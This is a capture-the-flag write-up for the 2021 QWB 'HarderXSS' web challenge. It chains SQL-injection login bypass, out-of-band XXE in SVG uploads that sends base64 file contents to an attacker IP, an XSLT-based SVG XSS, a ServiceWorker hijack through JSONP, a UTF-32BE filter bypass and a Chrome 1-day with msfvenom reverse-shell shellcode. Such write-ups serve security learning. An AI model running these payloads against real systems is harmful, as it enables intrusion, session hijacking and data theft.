### References

- [@Icystal, HarderXSS 出题心得暨非官方WP, 2021-06-17](https://www.icystal.top/ctf15-qwb2021harderxss/)
- [@LWFLKY, 2021-强网杯Web-HarderXSS-复现-WP, 2021-06-15](https://blog.funnything.net/2021/06/15/2021-qwb-web-harderxss-writeup/)

**Tag: Svg XSS&XXE, ServiceWorker**

1.`/login` page have sql injection but baned `from`, we can use the `1'or(1)#` and any password login as admin.

```tex
username: 1'or(1)#
password: 1
```

but it still shows please login first, `Set-Cookie` in response:

```tex
Set-Cookie: PHPSESSID=qg6occ95niok3qaruusvm0mt92; path=/; domain=.cubestone.com
```

so use burpsuite change the domain with your ip, it will work fine.

Alternatively, you can modify the hosts file directly:

```tex
192.168.200.129 feedback.cubestone.com
192.168.200.129 flaaaaaaaag.cubestone.com
```

2.In `/admin` page, view source code can find a `display:none` elements:

```html
<a href="https://flaaaaaaaag.cubestone.com?secret=demo" style="display:none">内网管理中心</a>
```

accessed directly will get 403 Forbidden, guess it should use SSRF.

in `/user` page, we can upload profile and the home page mentions it support `.svg` file. So we can test svg+xxe to read files. Testing found that the `file://` was filtered, so using `php://filter`

```xml
<!--xxe.svg-->
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY % remote SYSTEM "http://192.168.200.1:8000/xxe.dtd">
    %remote;%start;%send;
]>
<svg xmlns="http://www.w3.org/2000/svg">
</svg>

<!--xxe.dtd-->
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=upload.php">
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://192.168.200.1:9001/?%file;'>">
```

![img1](./assets/img1.png?raw=true)

Requires two requests to receive the data, Because the `upload.php` as follows:

```php
$dom = new DOMDocument();
$res=$dom->loadXML($decode,LIBXML_DTDLOAD);
if(!$res)
    die("Not Image!");
$decode1=$dom->saveXML();
//防止本地文件读取
if(preg_match("/file:|data:|zlib:|php:\/\/stdin|php:\/\/input|php:\/\/fd|php:\/\/memory|php:\/\/temp|expect:|ogg:|rar:|glob:|phar:|ftp:|ssh2:|bzip2:|zip:|ftps:/i",$decode1,$matches))
    die("unsupport protocol: ".$matches[0]);
if(preg_match("/\/var|\/etc|\.\.|\/proc/i",$decode1,$matches)){
    die("Illegal URI: ".$matches[0]);
}
$res=$dom->loadXML($decode,LIBXML_NOENT);
if(!$res)
    die("Not Image!");
$decode=$dom->saveXML();
```

or you can use the webhook.site to receive data :>

We can then use the xxe to read the previous 403 pages:

```dtd
<!--xxe.dtd-->
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=https://flaaaaaaaag.cubestone.com?secret=demo">
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://192.168.200.1:9001/?%file;'>">
```

content:

```bash
$ echo 'PHNjcmlwdCA+CmRvY3VtZW50LmRvbWFpbj0iY3ViZXN0b25lLmNvbSI7CmZ1bmN0aW9uIHBhZ2Vsb2FkKGRhdGEpewogICAgZG9jdW1lbnQuYm9keS5pbm5lclRleHQ9ZGF0YTsKfQpmZXRjaChgbG9hZGVyLnBocD9jYWxsYmFjaz1wYWdlbG9hZCZzZWNyZXQ9ZGVtb2ApLnRoZW4oKHJlcyk9PntyZXR1cm4gcmVzLnRleHQoKTt9KS50aGVuKChkYXRhKT0+e2V2YWwoZGF0YSk7fSk8L3NjcmlwdD4K' | base64 -d
<script >
document.domain="cubestone.com";
function pageload(data){
    document.body.innerText=data;
}
fetch(`loader.php?callback=pageload&secret=demo`).then((res)=>{return res.text();}).then((data)=>{eval(data);})</script>
```

here is a jsonp, read it again:

```dtd
<!--xxe.dtd-->
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=https://flaaaaaaaag.cubestone.com/loader.php?callback=pageload&secret=demo">
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://192.168.200.1:9001/?%file;'>">
```

content:

```bash
$ echo 'cGFnZWxvYWQoJ0NvbnRyb2wgY2VudGVyIGFjY2VzcyByZXF1aXJlIGEgdmFpbGQgc2VjcmV0IGtleS4gWW91IGVudGVyZWQgYSBpbnZhaWxkIHNlY3JldCEnKQ==' | base64 -d
pageload('Control center access require a vaild secret key. You entered a invaild secret!')
```

so we can use the jsonp to accessing cross-site data, but the secret is invaild.

3.Now we need to consider svg+xss to get the secret, testing found that the `script` and `onload` is disabled here.

In reference[2], the author find `onanimationend` attribute to execute the code, and use the [xslt transforming xml to xhtml](https://developer.mozilla.org/en-US/docs/Web/XSLT/Transforming_XML_with_XSLT), make the browser parse directly into html pages when accessing svg:

```xml
<!-- xss.jpg -->
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<html>
<head><style>@keyframes x{}</style></head>
<body>
<svg style="animation-name:x" onanimationend="alert(1)"></svg>
</body></html>
</xsl:template>
</xsl:stylesheet>
```

upload it as jpg and get the path, then upload the following svg:

```xml
<!-- xss.svg -->
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="/upload/0bbeafb5a94d86bcbd9fa7d69bb42098"?>
<svg xmlns="http://www.w3.org/2000/svg">
</svg>
```

and refresh `/user` page we can see the pop-up :)

![img2](./assets/img2.png?raw=true)

4.In the `/submit` page, we can submit feedback with a link which will accessed by admin bot. Following the hints, the bot will open the link we submitted first, then `flaaaaaaaag.cubestone.com`.

We have xss and jsonp, this means that we can intercept requests from the flaaaaaaaaaag site through xss cross-domain implantation of ServiceWorker. Refer: [XSS With Service Worker](https://lightless.me/archives/XSS-With-Service-Worker.html)

Modify the contents of `xss.jpg`:

```html
<svg style="animation-name:x" onanimationend="s=createElement('scr'+'ipt');body.appendChild(s);s.src='https://192.168.200.1:8000/xss.js';"></svg>
```

`xss.js` register serviceworker by embedding an iframe:

```js
if(!window.__x) {
    document.domain = "cubestone.com";
    var iframe = document.createElement('iframe');
    iframe.src = 'https://flaaaaaaaag.cubestone.com';
    iframe.addEventListener("load", function(){ iffLoadover(); });
    document.body.appendChild(iframe);
    exp = `
    var xhr = new XMLHttpRequest();
    navigator.serviceWorker.register("/loader.php?secret=asdasd&callback=importScripts('//192.168.200.1:8000/sw.js');//")`;
    function iffLoadover(){
        iframe.contentWindow.eval(exp);
    }
    window.__x=1;
}
```

`sw.js` listen the `fetch` event intercept the user's request and tamper the response:

```js
this.addEventListener('fetch', function (event) {
    var body = "<script>location='http://192.168.200.1:9001/'+location.search;</script>";
    var init = {headers: {"Content-Type": "text/html"}};
    var res = new Response(body, init);
    event.respondWith(res.clone());
});
```

5.Another problem here is that the admin bot access path is `https`, so we can use the python implementing a simple https server:

```python
# openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
import ssl
from http.server import SimpleHTTPRequestHandler, HTTPServer

port = 8000
httpd = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
print(f"Https Server Listening on [0.0.0.0:{port}]")
httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
```

Now everything is ready, upload the xss.jpg and get path, then upload xss.svg. Afterwards, submit the `/user` page to the bot and trigger the xss

the `/submit` page has captcha, simply brute force it with a script:

```python
import hashlib

def md5(s):
    return hashlib.md5(s).hexdigest()

def verify(s):
    for i in range(1, 9999999):
        if md5(str(i).encode("utf8")).startswith(s):
            return(i)
            break
```

![img3](./assets/img3.png?raw=true)

### Unintend solution - Apache server-status

Apache2's Server-status is on by default, so we can use xxe to read the `server-status`:

```dtd
<!-- xxe.dtd -->
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=http://127.0.0.1/server-status">
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://192.168.200.1:9001/?%file;'>">
```

then use the php decode:

```php
php > echo zlib_decode(base64_decode("$data");
```

![img4](./assets/img4.png?raw=true)

However, this method can only be used if the flag is short, if the flag is too long, we will only read half of it.

### Unintend solution - Encoding XML

The upload file filtered `/dev`, `/proc`, `/var`, `..`, but xml also supports other encoding formats besides utf-8, refer to [XXE that can Bypass WAF Protection](https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0/). Here try using `utf-32be`:

```xml
<!-- xxe.svg -->
<?xml version="1.0" encoding="UTF-32BE"?>
<!DOCTYPE test [
    <!ENTITY % remote SYSTEM "http://192.168.200.1:8000/xxe.dtd">
    %remote;%start;%send;
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
</svg>
```

if we can find out where the flag stored, here because i known in advance :p

```dtd
<!-- xxe.dtd -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=../../visitor/flag">
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://192.168.200.1:9001/?%file;'>">
```

Then use following command covert the svg file:

```bash
$ iconv -f utf8 -t UTF-32BE xxe.svg > u32.svg
```

the external entity does not need to do anything else, it will become the corresponding encoding after the external entity is loaded.

![img5](./assets/img5.png?raw=true)

### Unintend solution - Chrome 1day

we can see the bot UA is HeadlessChrome/86.0.4240.75 which affected by chrome v8 1day: https://github.com/r4j0x00/exploits/tree/master/CVE-2020-16040

generate shellcode:

```bash
$ msfvenom -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.200.130 LPORT=4444 -f c > shell.c
```

msfconsole set listener:

```bash
$ msfconsole
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.200.130
set LPORT 4444
exploit
```

submit link with the exploit page:

```tex
http://192.168.200.1:8000/exploit.html
```

![img6](./assets/img6.png?raw=true)
